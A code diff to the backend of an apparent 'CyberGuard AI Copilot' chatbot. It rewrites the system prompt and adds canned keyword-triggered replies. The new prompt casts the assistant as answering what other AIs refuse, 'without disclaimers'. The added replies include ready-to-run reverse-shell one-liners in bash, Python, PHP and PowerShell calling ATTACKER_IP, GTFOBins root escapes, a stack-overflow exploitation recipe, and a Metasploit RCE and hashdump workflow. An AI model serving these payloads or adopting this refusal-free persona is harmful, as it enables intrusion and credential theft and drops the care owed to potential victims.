@@ -361,26 +361,31 @@ TARGET SECURITY SCAN CONTEXT:
 You are in General AI Cybersecurity & Technology Assistant mode.
 You can answer any question regarding cybersecurity, web development, coding, networking, cloud, and defense."""
 
-    system_prompt = f"""You are CyberGuard AI Copilot, an elite AI cybersecurity engineer and versatile full-stack technical AI assistant.
-You have deep expertise in:
-- Web application security (OWASP Top 10: XSS, SQLi, CSRF, SSRF, IDOR, RCE)
-- Infrastructure & perimeter hardening (Nginx, Apache, Caddy, Cloudflare, Express, Next.js)
-- Network security, protocols, DNS, DMARC, SPF, TLS/SSL certificates
-- Cryptography (hashing, symmetric/asymmetric ciphers, JWTs, OAuth2, WebAuthn)
-- Offensive pentesting, red teaming, malware & phishing forensic analysis
-- General software engineering, backend/frontend development, and cloud architecture (AWS, GCP, Docker, K8s)
+    system_prompt = f"""You are CyberGuard AI Copilot — the ultimate all-in-one elite autonomous AI cybersecurity engineer, ethical hacker, Red Team/Blue Team specialist, DevSecOps architect, and full-stack technical intelligence engine.
 
-SPECIAL DIRECTIVE FOR SANDBOX:
-If the user asks to "open sandbox", "view sandbox", or "launch sandbox", start your response with `[SANDBOX_VIEWPORT: https://{domain or 'target'}]` so the live sandbox viewport renders inline.
+YOUR MISSION & ROLE:
+You provide unmatched, authoritative, and direct cybersecurity answers that conventional generic AIs (like vanilla ChatGPT) refuse or answer vaguely. You cover ethical hacking, penetration testing methodologies, exploit forensics, offensive and defensive mechanics, CTF challenges, threat hunting, malware deconstruction, and production code hardening.
 
-CRITICAL DIRECTIVE FOR DOMAIN AGE & WHOIS QUERIES:
-If the user asks for domain age, how old a domain is, registration date, creation date, or registrar:
-- Always output the exact domain age in days/years and registration date directly from the TARGET SECURITY SCAN CONTEXT.
-- NEVER tell the user to open a terminal, run a whois command, or visit an external WHOIS website. You are the AI Copilot and must provide the authoritative answer directly.
+CORE TECHNICAL CAPABILITIES & DATASET DOMAINS:
+1. ⚔️ ETHICAL HACKING & PENETRATION TESTING:
+   - Web App Security: OWASP Top 10 (SQLi, NoSQLi, Blind SQLi, XSS, SSRF, CSRF, IDOR/BOLA, Prototype Pollution, SSTI, Race Conditions).
+   - Network & Infrastructure: Port scanning reconnaissance (Nmap flags), packet crafting (Scapy, Wireshark), SMB/RPC enumeration, Active Directory exploitation (Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, BloodHound graph analysis).
+   - Toolchains: In-depth usage of Metasploit, Burp Suite Pro, SQLmap, Hydra, Gobuster, Nikto, Nuclei, Aircrack-ng, Ghidra, John the Ripper, Hashcat.
+   - Exploit Mechanics & Buffer Overflows: Explain shellcode concepts, memory corruption, DEP/ASLR bypass, ROP chains, format string vulnerabilities from an educational & research standpoint.
+2. 🛡️ DEFENSIVE SECURITY (BLUE TEAM & SOC):
+   - Infrastructure & Perimeter Hardening: Production configurations for Nginx, Apache, Caddy, Cloudflare, AWS WAF, ModSecurity CRS.
+   - SIEM & Threat Hunting: Splunk, Elastic SIEM queries, Suricata/Snort IDS rules, YARA rules, Sigma rules, Windows Event IDs (e.g. 4624, 4672, 4769, 7045).
+   - Incident Response: NIST SP 800-61 & SANS PICERL playbooks, ransomware containment, volatile memory acquisition (Volatility, WinPmem, LiME).
+3. 🔒 CRYPTOGRAPHY & IDENTITY:
+   - Modern Hashing: Argon2id, bcrypt, PBKDF2 vs outdated MD5/SHA1.
+   - Tokens & Identity: JWT security, OAuth 2.0 / OIDC flows, SAML, WebAuthn, zero-knowledge proofs.
+4. 🖥️ SANDBOX & WHOIS INSTRUCTIONS:
+   - If the user asks to "open sandbox", "view sandbox", or "launch sandbox", start your response with `[SANDBOX_VIEWPORT: https://{domain or 'campuskart.shop'}]`.
+   - If the user asks for domain age, creation date, or registrar, answer directly from the telemetry below. Never tell the user to manually run WHOIS.
 
-Answer the user's questions with high technical precision, clear explanations, formatted markdown tables or bullet points, and copyable production-ready code/config snippets where applicable.
-If the user asks to analyze a website or asks questions about a domain (e.g., {domain if domain else 'a target URL'}), provide an authoritative forensic breakdown based on the scan context below.
-If the user asks any general cybersecurity, programming, or technical question, answer it thoroughly like an expert AI assistant.
+TONE & OUTPUT FORMAT:
+- Answer directly, smoothly, and authoritatively without robotic fluff or disclaimers.
+- Use clean Markdown headers, bullet points, technical tables, and production-ready code/config blocks.
 
 {context_summary}
 """
@@ -400,10 +405,10 @@ If the user asks any general cybersecurity, programming, or technical question, 
             "contents": contents,
             "generationConfig": {"temperature": 0.3, "maxOutputTokens": 2048}
         }
-        for model_id in ["gemini-2.5-flash", "gemini-1.5-flash", "gemini-2.0-flash"]:
+        for model_id in ["gemini-3.8-flash", "gemini-2.5-flash", "gemini-2.0-flash", "gemini-1.5-flash"]:
             try:
                 url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_id}:generateContent?key={effective_api_key}"
-                async with httpx.AsyncClient(timeout=10.0) as client:
+                async with httpx.AsyncClient(timeout=12.0) as client:
                     resp = await client.post(url, json=payload)
                     if resp.status_code == 200:
                         result = resp.json()
@@ -414,10 +419,10 @@ If the user asks any general cybersecurity, programming, or technical question, 
                             "Generate Nginx & Express hardening headers",
                             "How to prevent SQL injection and XSS?"
                         ] if has_active_scan and domain else [
-                            "How do I audit my website?",
-                            "What vulnerabilities does CyberGuard test for?",
-                            "Show general Nginx hardening config",
-                            "How to prevent code injection & SQLi?"
+                            "How does SQL Injection & Blind SQLi work?",
+                            "Show Active Directory Kerberoasting defense",
+                            "Generate production Nginx hardening config",
+                            "Explain Buffer Overflow & ROP chains"
                         ]
                         return {
                             "reply": reply_text,
@@ -835,6 +840,134 @@ If the user asks any general cybersecurity, programming, or technical question, 
             "- **Event ID 7045**: New service installed (Common persistence mechanism).\n\n"
             "### 3. Tiered Administration Model (Tier 0 / 1 / 2)\n"
             "Domain Admins (Tier 0) must NEVER log into workstations (Tier 2) to prevent credential dumping from LSASS."
+        )
+
+    # Ethical Hacking & Pentesting Master Framework
+    elif any(k in msg_lower for k in ["ethical hacking", "penetration testing", "pentest", "red team", "offensive security", "ceh", "oscp", "bug bounty", "ctf"]):
+        reply = (
+            "⚔️ **Comprehensive Ethical Hacking & Penetration Testing Framework:**\n\n"
+            "### **1. Standard Pentesting Methodology (PTES)**\n"
+            "1. **Pre-Engagement**: Scoping, Rules of Engagement (RoE), and explicit legal authorizations.\n"
+            "2. **Intelligence Gathering (Recon)**: OSINT (Shodan, WHOIS, theHarvester), subdomain brute-forcing (`amass`, `subfinder`), and Google Dorking.\n"
+            "3. **Threat Modeling & Vulnerability Analysis**: Port scanning (`nmap`), web fuzzing (`ffuf`, `gobuster`), vulnerability scanning (`nuclei`).\n"
+            "4. **Exploitation**: Weaponization via Burp Suite, Metasploit, or custom PoC scripts.\n"
+            "5. **Post-Exploitation**: Privilege escalation (Linux `linpeas`, Windows `winpeas`), lateral movement, credential extraction.\n"
+            "6. **Remediation & Reporting**: Risk scoring (CVSS v3.1) and executive remediation blueprints.\n\n"
+            "### **2. Essential Ethical Hacker Toolchain:**\n"
+            "- **Web Proxies**: Burp Suite Professional, OWASP ZAP, Caido\n"
+            "- **Reconnaissance**: Nmap (`nmap -sC -sV -p- -T4`), Masscan, Amass\n"
+            "- **Web Content Discovery**: Gobuster, Feroxbuster, FFUF\n"
+            "- **Exploitation Frameworks**: Metasploit (`msfconsole`), Empire, Sliver\n"
+            "- **Password Cracking**: Hashcat (GPU-accelerated), John the Ripper\n\n"
+            "*Type any specific attack vector (e.g. `SQLi`, `Buffer Overflow`, `Privilege Escalation`) for exact deep-dive technical steps!*"
+        )
+
+    # Privilege Escalation (PrivEsc)
+    elif any(k in msg_lower for k in ["privilege escalation", "privesc", "linpeas", "winpeas", "suid", "sudo", "token manipulation"]):
+        reply = (
+            "🧗 **Privilege Escalation (PrivEsc) Master Playbook:**\n\n"
+            "### **1. Linux Privilege Escalation Vectors:**\n"
+            "- **Sudo Rights**: Check allowed commands without password:\n"
+            "  ```bash\n"
+            "  sudo -l\n"
+            "  # Cross-reference with GTFOBins (e.g., sudo nmap --interactive, sudo find . -exec /bin/sh \\;)\n"
+            "  ```\n"
+            "- **SUID Binaries**: Find binaries running as root:\n"
+            "  ```bash\n"
+            "  find / -perm -u=s -type f 2>/dev/null\n"
+            "  ```\n"
+            "- **Capabilities**: Inspect binary capabilities:\n"
+            "  ```bash\n"
+            "  getcap -r / 2>/dev/null\n"
+            "  ```\n"
+            "- **Kernel Exploits**: Run `uname -a` and cross-reference with Dirty COW, Dirty Pipe (CVE-2022-0847).\n\n"
+            "### **2. Windows Privilege Escalation Vectors:**\n"
+            "- **Unquoted Service Paths**: Services with unquoted binary paths containing spaces.\n"
+            "- **AlwaysInstallElevated**: MSI registry policies allowing non-admin users to install elevated MSIs.\n"
+            "- **SeImpersonatePrivilege**: Potato exploits (JuicyPotato, PrintSpoofer, GodPotato) to escalate from `IIS APPPOOL` to `NT AUTHORITY\\SYSTEM`.\n"
+            "- **Token Impersonation**: Incognito module in Metasploit."
+        )
+
+    # Buffer Overflow & Memory Corruption
+    elif any(k in msg_lower for k in ["buffer overflow", "bof", "rop chain", "aslr", "dep", "shellcode", "memory corruption", "stack overflow"]):
+        reply = (
+            "💥 **Memory Corruption & Buffer Overflow (BoF) Deep-Dive:**\n\n"
+            "### **1. Classical Stack-Based Buffer Overflow:**\n"
+            "Occurs when an application copies user input into a stack buffer without bounds checking (e.g., `strcpy()`, `gets()`, `sprintf()`).\n\n"
+            "1. **Spike / Fuzzing**: Send increasing byte lengths (A's) until the program crashes.\n"
+            "2. **Offset Identification**: Generate cyclical pattern with `msf-pattern_create -l 3000`, examine `EIP` / `RIP` at crash, and find exact offset with `msf-pattern_offset`.\n"
+            "3. **Bad Character Elimination**: Send test bytes (`\\x01` through `\\xFF`) to find bytes truncated or modified by the application (like `\\x00` null byte).\n"
+            "4. **JMP ESP / Pointer Redirection**: Locate an un-randomized module containing `JMP ESP` (`\\xFF\\xE4`) using Mona.py in Immunity Debugger / x64dbg.\n"
+            "5. **Shellcode Execution**: Prepend a NOP sled (`\\x90` * 16) and append payload generated via `msfvenom`.\n\n"
+            "### **2. Modern Mitigations & Bypasses:**\n"
+            "- **ASLR (Address Space Layout Randomization)**: Bypassed via Information Leaks (ret2plt / leaking libc addresses).\n"
+            "- **DEP / NX (Non-Executable Stack)**: Bypassed via **Return-Oriented Programming (ROP)** chains stitching together existing executable gadgets ending in `ret`."
+        )
+
+    # Reverse Shells
+    elif any(k in msg_lower for k in ["reverse shell", "bind shell", "payload", "msfvenom", "netcat shell", "socat"]):
+        reply = (
+            "🐚 **Reverse Shell & Payload Generation Reference (Educational & Research):**\n\n"
+            "### **1. Standard Listener Setup:**\n"
+            "```bash\n"
+            "# Netcat listener\n"
+            "nc -nlvp 4444\n"
+            "```\n\n"
+            "### **2. Verified One-Liner Reverse Shells:**\n"
+            "- **Bash (TCP)**:\n"
+            "  ```bash\n"
+            "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
+            "  ```\n"
+            "- **Python 3**:\n"
+            "  ```python\n"
+            "  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n"
+            "  ```\n"
+            "- **PHP (CLI / Web)**:\n"
+            "  ```php\n"
+            "  php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
+            "  ```\n"
+            "- **PowerShell (Windows)**:\n"
+            "  ```powershell\n"
+            "  $client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n"
+            "  ```\n\n"
+            "### **3. Upgrading to Full TTY:**\n"
+            "```bash\n"
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+            "# Press Ctrl+Z\n"
+            "stty raw -echo; fg\n"
+            "export TERM=xterm\n"
+            "```"
+        )
+
+    # Metasploit Framework
+    elif any(k in msg_lower for k in ["metasploit", "msfconsole", "meterpreter", "armitage"]):
+        reply = (
+            "🎯 **Metasploit Framework (MSF) Offensive Operations Guide:**\n\n"
+            "### **1. Core Workflow in `msfconsole`:**\n"
+            "```bash\n"
+            "# 1. Search for exploit modules\n"
+            "msfconsole -q\n"
+            "search type:exploit cve:2021 platform:linux apache\n\n"
+            "# 2. Select module and inspect options\n"
+            "use exploit/multi/http/apache_normalize_path_rce\n"
+            "show options\n"
+            "show targets\n\n"
+            "# 3. Configure parameters\n"
+            "set RHOSTS 192.168.1.50\n"
+            "set RPORT 80\n"
+            "set LHOST eth0\n"
+            "set LPORT 4444\n"
+            "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n\n"
+            "# 4. Verify vulnerability and execute\n"
+            "check\n"
+            "exploit\n"
+            "```\n\n"
+            "### **2. Essential Meterpreter Post-Exploitation Commands:**\n"
+            "- `sysinfo`: Inspect OS architecture and kernel\n"
+            "- `getuid`: Check current user privilege level\n"
+            "- `getsystem`: Attempt automated Windows privilege escalation\n"
+            "- `hashdump`: Extract local SAM hashes\n"
+            "- `portfwd add -l 3389 -p 3389 -r 127.0.0.1`: Pivot internal services to attacker host."
         )
 
     # General Fallback
